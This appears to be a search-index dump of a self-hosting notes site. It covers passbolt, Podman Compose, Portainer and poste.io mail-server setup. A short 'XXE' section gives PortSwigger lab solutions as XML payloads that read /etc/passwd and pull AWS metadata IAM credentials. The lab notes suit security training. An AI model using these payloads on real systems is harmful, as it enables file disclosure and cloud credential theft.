EMAIL_TRANSPORT_DEFAULT_PORT Server port <code>25</code> EMAIL_TRANSPORT_DEFAULT_USERNAME Username for email server auth <code>null</code> EMAIL_TRANSPORT_DEFAULT_PASSWORD Password for email server auth <code>null</code> EMAIL_TRANSPORT_DEFAULT_TLS Set tls <code>null</code> <p>For more information on which environment variables are available on passbolt, please check the passbolt environment variable reference.</p> <p>Step 4. Start your containers</p> <pre><code>docker-compose -f docker-compose-ce.yaml up -d\n</code></pre> <p>Step 5. Create first admin user</p> <pre><code>$ docker-compose -f docker-compose-ce.yaml exec passbolt su -m -c \"/usr/share/php/passbolt/bin/cake \\\n                                passbolt register_user \\\n                                -u &lt;your@email.com&gt; \\\n                                -f &lt;yourname&gt; \\\n                                -l &lt;surname&gt; \\\n                                -r admin\" -s /bin/sh www-data\n</code></pre> <p>It will output a link similar to the below one that can be pasted on the browser to finalize user registration:</p> <pre><code>https://my.domain.tld/setup/install/1eafab88-a17d-4ad8-97af-77a97f5ff552/f097be64-3703-41e2-8ea2-d59cbe1c15bc\n</code></pre> <p>At this point, you should have a working docker setup running on the latest tag. However, it is recommended that users pull the tags pointing to specific passbolt versions when running in environments other than testing.</p>"},{"location":"Podman/Podman/","title":"Podman","text":""},{"location":"Podman/Podman/#introduction","title":"Introduction","text":"<p>Docker Compose is a command-line tool that uses a specially formatted YAML file as input to assemble and then run single, or multiple, containers as applications. This allows developers to develop, test and then deliver to their users a single YAML file for their application, and use only one command to start, and stop, it reliably. This portability and reliability has made Docker Compose not only hugely popular with both users and developers, but increasingly a requirement.</p>"},{"location":"Podman/Podman/#objectives","title":"Objectives","text":"<p>This lab shows how to install and use both <code>podman-compose</code> and <code>docker-compose</code> with Podman, and verify they work with a simple <code>docker-compose.yaml</code> file.</p>"},{"location":"Podman/Podman/#prerequisites","title":"Prerequisites","text":"<ul> <li>A client system with Oracle Linux installed</li> <li>Podman installed (the \u2018container-tools\u2019 package)</li> <li>Access to the Internet</li> </ul>"},{"location":"Podman/Podman/#oracle-support-disclaimer","title":"Oracle Support Disclaimer","text":"<p>Oracle does not provide technical support for the sequence of steps that are provided in the following instructions because these steps refer to software programs and operating systems that are not provided by Oracle. This tutorial provides optional instructions as a convenience only.</p> <p>For more information about Oracle\u2019s supported method for the development and usage of Podman-based services see https://docs.oracle.com/en/operating-systems/oracle-linux/podman/.</p>"},{"location":"Podman/Podman/#setup-the-lab-environment","title":"Setup the Lab Environment","text":"<p>Note: When using the free lab environment, see Oracle Linux Lab Basics for connection and other usage instructions.</p> <ol> <li>Open a terminal and connect via ssh to the ol-server instance if not already connected.</li> </ol> <p><code>Copy    ssh oracle@&lt;ip_address_of_instance&gt;</code></p>"},{"location":"Podman/Podman/#confirm-podman-works","title":"Confirm Podman Works","text":"<p>The container-tools package in Oracle Linux provides the latest versions of Podman, Buildah, Skopeo, and associated dependencies.</p> <ol> <li>Check the version of Podman.</li> </ol> <p><code>Copy    podman -v</code></p> <ol> <li>Confirm the Podman CLI is working.</li> </ol> <p><code>Copy    podman run quay.io/podman/hello</code></p> <p>Example Output:</p> <p>``` Copy[oracle@ol-server ~]$ podman run quay.io/podman/hello Trying to pull quay.io/podman/hello:latest... Getting image source signatures Copying blob f82b04e85914 done Copying config dbd85e09a1 done Writing manifest to image destination Storing signatures !... Hello Podman World ...!</p> <pre><code>     .--\"--.           \n   / -     - \\         \n  / (O)   (O) \\\n</code></pre> <p>~~~| -=(,Y,)=- |            .---. /`  \\   |~~      ~/  o  o \\~~~~.----. ~~    | =(X)= |~  / (O (O) \\     ~~~~~~~  ~| =(Y_)=-  |    ~~~~    ~~~|   U      |~~ </p> <p>Project:   https://github.com/containers/podman Website:   https://podman.io Documents: https://docs.podman.io Twitter:   @Podman_io ```</p>"},{"location":"Podman/Podman/#setup-podman-to-work-with-compose-files","title":"Setup Podman to Work with Compose Files","text":"<p>Podman introduced support for Docker Compose functionality in Podman v3.2.0, after limited support was introduced in Podman v3.0.0, thereby introducing the ability to use Docker Compose from within Podman. More recently Podman v4.1.0 extended the support of Docker Compose functionality to include using Docker Compose v2.2 and higher.</p> <p>The following steps describe how to install, and configure, both of <code>podman-compose</code> and <code>docker-compose</code>.</p>"},{"location":"Podman/Podman/#install-the-podman-docker-package","title":"Install the Podman Docker Package","text":"<p>This enables Podman to work natively with Docker commands.</p> <ol> <li>Install the <code>podman-docker</code> package.</li> </ol> <p><code>Copy    sudo dnf install -y podman-docker</code></p>"},{"location":"Podman/Podman/#install-docker-compose","title":"Install Docker Compose","text":"<p>Note:</p> <p>Installing Compose in a standalone manner as described here requires using <code>docker-compose</code> instead of the standard syntax used when using the Docker utility of <code>docker compose</code>. In other words substitute the <code>docker compose up</code> syntax with <code>docker-compose up</code> instead.</p> <ol> <li>Download and install Compose standalone.</li> </ol> <p><code>Copy    sudo curl -SL https://github.com/docker/compose/releases/download/v2.15.1/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server ~]$ sudo curl -SL https://github.com/docker/compose/releases/download/v2.15.1/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 100 42.8M  100 42.8M    0     0   158M      0 --:--:-- --:--:-- --:--:--  158M</code></p> <ol> <li>Apply executable permissions to the binary.</li> </ol> <p><code>Copy    sudo chmod +x /usr/local/bin/docker-compose</code></p> <ol> <li>Confirm Compose standalone works.</li> </ol> <p><code>Copy    docker-compose version</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server ~]$ docker-compose version Docker Compose version v2.15.1</code></p>"},{"location":"Podman/Podman/#start-the-podman-socket","title":"Start the Podman Socket","text":"<p>The following steps are required to make Docker Compose functionality work by creating a Unix socket.</p> <ol> <li>Configure the Podman socket with these steps.</li> </ol> <p><code>Copysudo systemctl enable --now podman.socket    sudo systemctl status podman.socket</code></p> <p>Example Output:</p> <p>``` Copy[oracle@ol-server ~]$ sudo systemctl enable --now podman.socket Created symlink /etc/systemd/system/sockets.target.wants/podman.socket -&gt; /usr/lib/systemd/system/podman.socket. [oracle@ol-server ~]$ sudo systemctl status podman.socket * podman.socket - Podman API Socket    Loaded: loaded (/usr/lib/systemd/system/podman.socket; enabled; vendor preset)    Active: active (listening) since Thu 2023-01-19 20:58:20 GMT; 16s ago      Docs: man:podman-system-service(1)    Listen: /run/podman/podman.sock (Stream)    CGroup: /system.slice/podman.socket</p> <p>Jan 19 20:58:20 ol-server systemd[1]: Listening on Podman API Socket. ```</p> <ol> <li>Verify that the socket works as expected using curl.</li> </ol> <pre><code>Copy\nsudo curl -w \"\\n\" -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock http://localhost/_ping\n</code></pre> <p>Example Output:</p> <p><code>Copy[oracle@ol-server ~]$ sudo curl -w \"\\n\" -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock http://localhost/_ping OK [oracle@ol-server ~]$</code></p> <p>If the output of this command returns <code>OK</code>, then Compose functionality is successfully configured to work with docker-compose.yaml files.</p>"},{"location":"Podman/Podman/#install-podman-compose","title":"Install Podman Compose","text":"<p>Podman Compose is a Python 3 library that implements the Compose Specification to run with Podman.</p> <ol> <li>Before installing Podman Compose, confirm that pip is updated to the latest version.</li> </ol> <p><code>Copy    sudo -H pip3 install --upgrade pip</code></p> <ol> <li>Install the Podman Compose package.</li> </ol> <p><code>Copy    sudo pip3 install podman-compose</code></p> <p>When running the <code>pip3 install</code> as <code>sudo</code>, the WARNING messages can be ignored.</p> <ol> <li>Confirm Podman Compose works.</li> </ol> <p><code>Copy    podman-compose version</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server ~]$ podman-compose version ['podman', '--version', ''] using podman version: 4.2.0 podman-composer version  1.0.3 podman --version  podman version 4.2.0 exit code: 0</code></p>"},{"location":"Podman/Podman/#create-a-docker-compose-file","title":"Create a Docker Compose File","text":"<p>This docker-compose.yaml file allows the pulling and starting of the designated application.</p> <ol> <li>Create a directory for the test.</li> </ol> <p><code>Copy    mkdir -p Documents/examples/echo</code></p> <ol> <li>Change into the directory.</li> </ol> <p><code>Copy    cd Documents/examples/echo</code></p> <ol> <li>Create the docker-compose.yaml file.</li> </ol> <p>```    Copycat &gt;&gt; docker-compose.yaml &lt;&lt; EOF</p> <p>version: '3'     services:       web:         image: k8s.gcr.io/echoserver:1.4        ports:            - \"${HOST_PORT:-8080}:8080\"     EOF    ```</p> <ol> <li>Review the docker-compose.yaml just created.</li> </ol> <p><code>Copy    cat docker-compose.yaml</code></p> <p>Example Output:</p> <p>``` Copy[oracle@ol-server echo]$ cat docker-compose.yaml </p> <p>version: '3'  services:    web:      image: k8s.gcr.io/echoserver:1.4     ports:         - \"8080:8080\" ```</p>"},{"location":"Podman/Podman/#confirm-podman-compose-is-working","title":"Confirm Podman Compose is Working","text":"<ol> <li>Change into the directory where the docker-compose file is located.</li> </ol> <p>Important: <code>podman-compose</code> commands will not work unless you are in the directory where the <code>docker-compose.yaml</code> file is located.</p> <p><code>Copy    cd ~/Documents/examples/echo/</code></p> <ol> <li>Start the <code>echoserver</code> application.</li> </ol> <p><code>Copy    podman-compose up -d</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ podman-compose up -d ['podman', '--version', ''] using podman version: 4.2.0 ** excluding:  set() ['podman', 'network', 'exists', 'echo_default'] ['podman', 'network', 'create', '--label', 'io.podman.compose.project=echo', '--label', 'com.docker.compose.project=echo', 'echo_default'] ['podman', 'network', 'exists', 'echo_default'] podman create --name=echo_web_1 --label io.podman.compose.config-hash=123 --label io.podman.compose.project=echo --label io.podman.compose.version=0.0.1 --label com.docker.compose.project=echo --label com.docker.compose.project.working_dir=/home/oracle/examples/echo --label com.docker.compose.project.config_files=docker-compose.yaml --label com.docker.compose.container-number=1 --label com.docker.compose.service=web --net echo_default --network-alias web -p 8080:8080 k8s.gcr.io/echoserver:1.4 Trying to pull k8s.gcr.io/echoserver:1.4... Getting image source signatures Copying blob d3c51dabc842 done   Copying blob a3ed95caeb02 done   Copying blob 6d9e6e7d968b done   Copying blob 412c0feed608 done   Copying blob cd23f57692f8 done   Copying blob dcd34d50d5ee done   Copying blob a3ed95caeb02 skipped: already exists   Copying blob a3ed95caeb02 skipped: already exists   Copying blob a3ed95caeb02 skipped: already exists   Copying blob b4241160ce0e done   Copying blob 7abee76f69c0 done   Writing manifest to image destination Storing signatures 1b54b75ca13786d33df6708da1d83ecce14b055e78b03007c3c4e1f441e7139c exit code: 0</code></p> <p>Note: As with Podman, any container(s) referenced in the <code>docker-compose.yaml</code> file are only pulled if not already present on the system.</p> <ol> <li>Test the <code>echoserver</code> application is up and running.</li> </ol> <p><code>Copy    curl -X POST -d \"foobar\" http://localhost:8080/; echo</code></p> <p>Example Output:</p> <p>``` Copy[oracle@ol-server echo]$ curl -X POST -d \"foobar\" http://localhost:8080/; echo CLIENT VALUES: client_address=10.89.0.2 command=POST real path=/ query=nil request_version=1.1 request_uri=http://localhost:8080/</p> <p>SERVER VALUES: server_version=nginx: 1.10.0 - lua: 10001</p> <p>HEADERS RECEIVED: accept=/ content-length=6 content-type=application/x-www-form-urlencoded host=localhost:8080 user-agent=curl/7.61.1 BODY: foobar ```</p> <ol> <li>Additionally confirm success by reviewing the logs.</li> </ol> <p><code>Copy    podman-compose logs</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ podman-compose logs ['podman', '--version', ''] using podman version: 4.2.0 podman logs echo_web_1 10.89.0.2 - - [17/Jan/2023:12:46:47 +0000] \"POST / HTTP/1.1\" 200 446 \"-\" \"curl/7.61.1\" exit code: 0</code></p> <ol> <li>Use the Podman Compose utility to see running containers.</li> </ol> <p><code>Copy    podman-compose ps</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ podman-compose ps    ['podman', '--version', ''] using podman version: 4.2.0 podman ps -a --filter label=io.podman.compose.project=echo CONTAINER ID  IMAGE                      COMMAND               CREATED        STATUS            PORTS                   NAMES f4053947c8c1  k8s.gcr.io/echoserver:1.4  nginx -g daemon o...  2 minutes ago  Up 2 minutes ago  0.0.0.0:8080-&gt;8080/tcp  echo_web_1 exit code: 0</code></p> <p>Note: See other Podman Compose utility commands by running <code>podman-compose --help</code>. However, these additional commands are out of scope for this Lab.</p> <ol> <li>Now it is time to stop the echoweb service.</li> </ol> <p><code>Copy    podman-compose down</code></p>"},{"location":"Podman/Podman/#confirm-docker-compose-is-working","title":"Confirm Docker Compose is Working","text":"<ol> <li>(Optional) Change into the directory where the docker-compose file is located.</li> </ol> <p>Important: <code>docker-compose</code> commands will not work unless you are in the directory where the <code>docker-compose.yaml</code> file is located.</p> <p><code>Copy    cd ~/Documents/examples/echo/</code></p> <ol> <li>Start the <code>echoserver</code> application.</li> </ol> <p><code>Copy    sudo /usr/local/bin/docker-compose up -d</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ sudo /usr/local/bin/docker-compose up -d [+] Running 0/0 [+] Running 0/1echo-web-1  Starting                                                                                               0.0 [+] Running 0/1echo-web-1  Starting                                                                                               0.1 [+] Running 0/1echo-web-1  Starting                                                                                               0.2 [+] Running 0/1echo-web-1  Starting                                                                                               0.3 [+] Running 0/1echo-web-1  Starting                                                                                               0.4 [+] Running 0/1echo-web-1  Starting                                                                                               0.5 [+] Running 0/1echo-web-1  Starting                                                                                               0.6 [+] Running 0/1echo-web-1  Starting                                                                                               0.7 [+] Running 1/1echo-web-1  Starting                                                                                               0.8  \ufffd\ufffd\ufffd Container echo-web-1  Started                                                                                                0.8s</code></p> <p>NOTE:</p> <p>If the following output is returned when executing this command:</p> <p><code>Copy\ufffd\ufffd\ufffd Container echo-web-1  Starting                                                                                               0.9s Error response from daemon: cannot listen on the TCP port: listen tcp4 :8080: bind: address already in use</code></p> <p>Don\u2019t worry, it only means that the <code>podman-compose down</code> command wasn\u2019t executed, and the echoserver container previously started using <code>podman-compose</code> is still running. Follow the previous steps to stop it.</p> <ol> <li>Test the container is running.</li> </ol> <p><code>Copy    curl -X POST -d \"foobar\" http://localhost:8080/; echo</code></p> <p>Example Output:</p> <p>``` Copy[oracle@ol-server ~]$ curl -X POST -d \"foobar\" http://localhost:8080/; echo CLIENT VALUES: client_address=10.89.0.2 command=POST real path=/ query=nil request_version=1.1 request_uri=http://localhost:8080/</p> <p>SERVER VALUES: server_version=nginx: 1.10.0 - lua: 10001</p> <p>HEADERS RECEIVED: accept=/ content-length=6 content-type=application/x-www-form-urlencoded host=localhost:8080 user-agent=curl/7.61.1 BODY: foobar ```</p> <ol> <li>As before, use the Docker Compose utility to inspect the logs and confirm a successful request was returned by this application.</li> </ol> <p><code>Copy    sudo /usr/local/bin/docker-compose logs</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ sudo /usr/local/bin/docker-compose logs  echo-web-1  | 10.89.0.1 - - [17/Jan/2023:14:48:56 +0000] \"POST / HTTP/1.1\" 200 446 \"-\" \"curl/7.61.1\"</code></p> <ol> <li>The Docker Compose utility also provides a way to review the containers started by the Compose file.</li> </ol> <p><code>Copy    sudo /usr/local/bin/docker-compose ps</code></p> <p>Example Output:</p> <p><code>Copy echo-web-1        k8s.gcr.io/echoserver:1.4   \"nginx -g daemon off;\"   web             12 minutes ago      Up 12 minutes       8080/tcp</code></p> <p>Note: See other Docker Compose utility commands by running <code>docker-compose --help</code>. However, these additional commands are out of scope for this Lab.</p> <ol> <li>Stop the echoweb service.</li> </ol> <p><code>Copy    sudo /usr/local/bin/docker-compose down</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ sudo /usr/local/bin/docker-compose down [+] Running 0/0 [+] Running 0/1echo-web-1  Stopping                                                                                                   0.1 [+] Running 0/1echo-web-1  Stopping                                                                                                   0.2 [+] Running 0/1echo-web-1  Stopping                                                                                                   0.3 [+] Running 2/1echo-web-1  Removing                                                                                                   0.4  \ufffd\ufffd\ufffd Container echo-web-1  Removed                                                                                                    0.4s  \ufffd\ufffd\ufffd Network echo_default  Removed                                                                                                    0.0s</code></p>"},{"location":"Podman/Podman/#important-information","title":"Important Information","text":"<p>If both the <code>podman-compose</code> and <code>docker-compose</code> executables have been installed on the same system, it is important to note that it is not possible to invoke them interchangeably. This means that if a process is started by <code>podman-docker</code> it cannot be queried, or stopped by using the <code>docker-compose</code> utility, or vice-versa, as shown in the example below:</p> <ol> <li>Change into the directory where the Compose file is located.</li> </ol> <p>Important: The <code>podman-compose</code> or <code>docker-compose</code> commands will not work unless you are in the directory where the <code>docker-compose.yaml</code> file is located.</p> <p><code>Copy    cd ~/Documents/examples/echo/</code></p> <ol> <li>Start by using Podman Compose.</li> </ol> <p><code>Copy    podman-compose up -d</code></p> <ol> <li>Try to list the running containers using Docker Compose.</li> </ol> <p><code>Copy    sudo /usr/local/bin/docker-compose ps</code></p> <p>Example Output</p> <p><code>Copy[oracle@ol-server echo]$ sudo /usr/local/bin/docker-compose ps NAME                IMAGE               COMMAND             SERVICE             CREATED             STATUS              PORTS</code></p> <ol> <li>However using Podman Compose confirms the container is running.</li> </ol> <p><code>Copy    podman-compose ps</code></p> <p>Example Output:</p> <p><code>Copy[oracle@ol-server echo]$ podman-compose ps ['podman', '--version', ''] using podman version: 4.2.0 podman ps -a --filter label=io.podman.compose.project=echo CONTAINER ID  IMAGE                      COMMAND               CREATED        STATUS            PORTS                   NAMES 55335e797296  k8s.gcr.io/echoserver:1.4  nginx -g daemon o...  4 minutes ago  Up 4 minutes ago  0.0.0.0:8080-&gt;8080/tcp  echo_web_1 exit code: 0</code></p>"},{"location":"Portainer/compose/","title":"Compose","text":"<pre><code>version: '3'\n\nservices:\n  portainer:\n    image: portainer/portainer-ce:latest\n    container_name: portainer\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./portainer-data:/data\n    ports:\n      - 9000:9000\n</code></pre>"},{"location":"Portainer/templates/","title":"Templates","text":"<p>https://raw.githubusercontent.com/mycroftwilde/portainer_templates/master/Template/template.json</p> <p>https://raw.githubusercontent.com/nashosted/self-hosted-template/master/template.json</p>"},{"location":"Portswiger/XXE/","title":"XXE","text":"<pre><code>#Lab 1\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt; ##Solution\n&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;\n</code></pre> <pre><code>#Lab 2\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"&gt; ]&gt; ##Solut\n&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;\n</code></pre>"},{"location":"PosteMail/InstallDocker/","title":"Docker builds a corporate mailbox, porte.io tutorial","text":"<p>\ue612 Metawalk \ue60e 2023-05-20 PM</p> <p></p>"},{"location":"PosteMail/InstallDocker/#posteio-introduction","title":"poste.io introduction","text":"<p>First of all, you need to know that you can have your own domain name suffix mailbox by setting up a corporate mailbox. You can define your email address, and what admin, root, and info are used at will. Poste.io Official Network\uff1ahttps://poste.io/ Documentation\uff1ahttps://poste.io/doc/</p> <p>Poste.io is an email server solution designed to provide a simple and secure email system. It provides a complete mail server stack, including mail transmission agent \uff08MTA\uff09, mail transmission agent \uff08IMAP/POP3\uff09 and mail filter. Poste.io's design goal is easy to deploy and manage, and it is suitable for individual users, small businesses, and small and medium-sized organizations.</p> <p>Poste.io provides an intuitive Web interface that allows users to easily set up and manage their mail servers. It supports multiple domain names and user accounts, and provides functions such as user management, email filtration, spam and virus detection. In addition, Poste.io has also integrated web-based email clients to enable users to access and send emails through Web browsers. </p>"},{"location":"PosteMail/InstallDocker/#posteio-ready","title":"poste.io ready","text":"<ol> <li>Domain name, if not, click Gname Purchase a com, net or ororg, and do not recommend the use of untrusted domain name suffixes such as icu.</li> <li>vps, recommended for use Lekayun \uff0cOn the Chinese page, all the purchased hosts are turned on 25. It is recommended to purchase 2G memory or above \uff08 video presentation. I use CN2 GIA\uff08elasticity\uff092 core 1G \uff09, but it cannot be abused. Enterprises or individuals can apply for rDNS for normal use.</li> </ol> <p>As you know, the 25 vps on the market are not easy to find. The CC I introduced before is also directly supported by rDND. I can bind it in the background and register the address\uff1ahttps://app.cloudcone.com.cn/?ref=7462 Preferential vps can refer to the page\uff1ahttps://bbs.csdn.net/topics/610404063</p>"},{"location":"PosteMail/InstallDocker/#posteio-construction","title":"poste.io construction","text":"<p>This tutorial, the vps system I use is Ubuntu 20.04\uff01</p> <p>However, of course, we still conduct domain name analysis as follows\uff1a</p> Host record Record type Recorded value mail A Your IP address smtp CNAME mail.**.com pop CNAME mail.**.com imap CNAME mail.**.com @ MX mail.**.com @ TXT v=spf1 mx ~all <ol> <li>Update the system and install docker and screen\uff1b</li> </ol> <pre><code>apt  update &amp;&amp; apt install screen docker.io -y\n</code></pre> <ol> <li>Pull the mirror image\uff1b</li> </ol> <pre><code>docker pull analogic/poste.io\n</code></pre> <ol> <li>New mail catalog</li> </ol> <pre><code>mkdir /home/mail\n</code></pre> <ol> <li>Start the container in screen, pay attention to here: mail.*.com to change to your email domain name\uff01</li> </ol> <pre><code>screen\ndocker run \\\n    --net=host \\\n    -e TZ=Europe/Prague \\\n    -v /home/mail:/data \\\n    --name \"mailserver\" \\\n    -h \"mail.*.com\" \\\n    -t analogic/poste.io\n</code></pre> <ol> <li>Visit address mail.Your domain name/admin/install/server\uff08 is shown to be unsafe, continue to visit, set up the certificate \uff09 next, set the domain name, administrator mailbox and password.</li> <li>Find the label in the system settings<code>TLS Certificate</code>\uff0cAutomatically apply for a certificate. After applying for the certificate, you can visit https. Then in the domain name details, click to generate<code>redirect</code>\uff0cAdd domain name DKIM analysis after generation, for example\uff1a</li> </ol> <pre><code>s20230520790._domainkey.proxies.icu. IN TXT \"k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxdSK7/g146G3kTo9KrjXBmHJr6PQA80RbL/f6iAQ1zRgGi3n9sbxmXXsBFrgXhMqOdE5BTVts2Z1z2TsWyBHxhHYJcy2uDJN6xnTMOxiLWgjLkzcl49BM//53n75VLlQIJcmmRzHrHfbowWk8g7wAKH6ClC/GRoJ7VVs8/ESZYQPd1oQdcQ1XiDCt4XI7u+CzupfOKQ+9XnEsCKFQTye4Qtjbbp/SXI8CCl0Bdv8bdRAtwHxPGf2f8fee1KnmUCHWT5Cfdw9oB3Dwd77eTPKVFRtFYz7IT5yrk2HWmQT3oBVIepWpapxMIpviOX8zJ522HTlPuhBJhoi9Ep4qmzPnQIDAQAB\"\n</code></pre> <p></p> <ol> <li>In the mail account, delete users can be added; in the server state, check the diagnosis, and clearly see the server port state\uff1b</li> </ol> <p>By the way, let everyone test the command at the 25th port: telnet smtp.qq.com 25</p> <ol> <li>The mailing address of the mailbox user is mail.Your domain name/webmail/, you can test and send a letter; test the health of the mailbox https://www.mail-tester.com/</li> </ol> <p>It can be used if the score exceeds 5, but to get a higher score, you can submit a work order to apply for rDNS, provided that you cannot send spam.</p>"},{"location":"PosteMail/InstallDocker/#customer-end-settings","title":"Customer end settings","text":"<p>Receipt server \u3010IMAP\u3011</p> Set content EMAIL Your mailbox password Your email password Server \u3010Host Name\u3011 mail.*.com Port \u3010Port Number\u3011 993 Security SSL <p>Sender \u3010IMAP\u3011</p> Set content EMAIL Your mailbox password Your email password Server \u3010Host Name\u3011 mail.*.com Port \u3010Port Number\u3011 587 Security SSL"},{"location":"PosteMail/InstallDocker/#supplement","title":"supplement","text":"<p>Forgot to say, it\u2019s better to set a hostname again, referencehttps://iweec.com/221.html Or directly</p> <pre><code>sudo hostnamectl set-hostname mail.* .com\n</code></pre>"},{"location":"PosteMail/InstallDocker/#video-tutorial","title":"Video tutorial","text":"<pre><code>version: '3.7'\n\nservices:\n  nginx-proxy:\n    container_name: rproxy\n    image: jwilder/nginx-proxy\n    ports:\n    - \"80:80\"\n    - \"443:443\"\n    volumes:\n    - ./nginx/certs:/etc/nginx/certs:ro\n    - ./nginx/conf.d:/etc/nginx/conf.d\n    - ./nginx/vhosts.d:/etc/nginx/vhost.d\n    - ./nginx/html:/usr/share/nginx/html\n    - /var/run/docker.sock:/tmp/docker.sock:ro\n    restart: always\n    environment:\n    - \"TZ=Europe/Madrid\"\n    labels:\n    - com.github.jrcs.letsencrypt_nginx_proxy_companion.nginx_proxy\n\n  letsencrypt:\n    container_name: encrypt\n    image: jrcs/letsencrypt-nginx-proxy-companion\n    volumes:\n    - ./nginx/certs:/etc/nginx/certs:rw\n    - ./nginx/conf.d:/etc/nginx/conf.d\n    - ./nginx/vhosts.d:/etc/nginx/vhost.d\n    - ./nginx/html:/usr/share/nginx/html\n    - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    environment:\n    - \"TZ=Europe/Madrid\"\n\n  db:\n    container_name: mysql\n    image: mysql:5.7\n    ports:\n    - \"3306:3306\"\n    command: --default-authentication-plugin=mysql_native_password --lower_case_table_names=1\n    volumes:\n    - ./mysql:/var/lib/mysql\n    restart: unless-stopped\n    environment:\n      TZ: Europe/Madrid\n      MYSQL_ROOT_PASSWORD: rootpass\n      MYSQL_DATABASE: db_name\n      MYSQL_USER: user\n      MYSQL_PASSWORD: pass\n\n  mail:\n    container_name: poste\n    image: analogic/poste.io\n    ports:\n    - \"25:25\"\n    - \"110:110\"\n    - \"143:143\"\n    - \"465:465\"\n    - \"587:587\"\n    - \"993:993\"\n    - \"995:995\"\n    volumes:\n    - ./poste:/data\n    restart: always\n    environment:\n    - \"TZ=Europe/Madrid\"\n    - \"VIRTUAL_HOST=mail.madolell.com\"\n    - \"VIRTUAL_PORT=80\"\n    - \"LETSENCRYPT_HOST=mail.madolell.com\"\n    - \"LETSENCRYPT_EMAIL=admin@madolell.com\"\n    - \"HTTPS=OFF\"\n    - \"DISABLE_CLAMAV=TRUE\"\n</code></pre> <pre><code>version: '3'\nservices:                                                                                                                  \n  posteio:                                                                                                            \n    image: analogic/poste.io:latest                                                                                    \n    container_name: poste.io                                                                                    \n    hostname: mail.madolell.tk                                                                             \n    restart: always\n    expose: \n      - '80'\n      - '25'    # SMTPS - mostly processing incoming mails\n      - '465'    # SMTPS - mostly processing incoming mails\n      - '110'  #  POP3 - standard protocol for accessing mailbox, STARTTLS is required before client auth   \n      - '143'  #  IMAP - standard protocol for accessing mailbox, STARTTLS is required before client auth\n      - '443'  #  HTTPS - access to administration or webmail client                                \n      - '587'  #  MSA - SMTP port used primarily for email clients after STARTTLS and auth            \n      - '993'  #  IMAPS - alternative port for IMAP encrypted since connection                        \n      - '995'  #  POP3S - encrypted POP3 since connections                                            \n    environment:                                                                                             \n      - HTTPS=OFF                                                                                         \n    volumes:                                                                                                 \n      - './containers/poste.io/data:/data'                                                                \n      - '/etc/localtime:/etc/localtime:ro'                                                                  \n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.mail.rule=Host(`mail.madolell.tk`)\"\n      - \"traefik.http.routers.mail.entrypoints=websecure\"\n      - \"traefik.http.services.mail.loadbalancer.server.port=80\"\n    networks:\n      - public\n      - proxy\nnetworks:\n    public:\n    proxy:\n      external: true\n</code></pre> <pre><code>version: '3'\n\nservices:\n  nginx-proxy:\n    image: jwilder/nginx-proxy\n    labels:\n        com.github.jrcs.letsencrypt_nginx_proxy_companion.nginx_proxy: \"true\"\n    container_name: nginx-proxy\n    restart: unless-stopped\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - /data/nginx/conf.d:/etc/nginx/conf.d\n      - /data/nginx/vhost.d:/etc/nginx/vhost.d\n      - /data/nginx/html:/usr/share/nginx/html\n      - /data/nginx/certs:/etc/nginx/certs:ro\n      - /var/run/docker.sock:/tmp/docker.sock:ro\n\n  nginx-letsencrypt:\n    image: jrcs/letsencrypt-nginx-proxy-companion\n    container_name: nginx-letsencrypt\n    restart: unless-stopped\n    volumes:\n      - /data/nginx/conf.d:/etc/nginx/conf.d\n      - /data/nginx/vhost.d:/etc/nginx/vhost.d\n      - /data/nginx/html:/usr/share/nginx/html\n      - /data/nginx/certs:/etc/nginx/certs:rw\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    environment:\n      - NGINX_DOCKER_GEN_CONTAINER=nginx-proxy\n      - NGINX_PROXY_CONTAINER=nginx-proxy\n\n  mailserver:\n    image: poste.io/mailserver:dev\n    container_name: mailserver\n    restart: unless-stopped\n    ports:\n      - \"25:25\"\n      - \"110:110\"\n      - \"143:143\"\n      - \"587:587\"\n      - \"993:993\"\n      - \"995:995\"\n      - \"4190:4190\"\n    environment:\n      - LETSENCRYPT_EMAIL=info@analogic.cz\n      - LETSENCRYPT_HOST=mail.poste.io\n      - VIRTUAL_HOST=mail.poste.io\n      - HTTPS=OFF\n      - DISABLE_CLAMAV=TRUE\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /data/nginx/html/.well-known:/opt/www/.well-known\n      - /data/mailserver:/data\n</code></pre> <p>Hola Pelado! En primer lugar gracias por el tutorial para instalar Poste.io. Ya lo tengo corriendo en mi servidor y funciona excelente 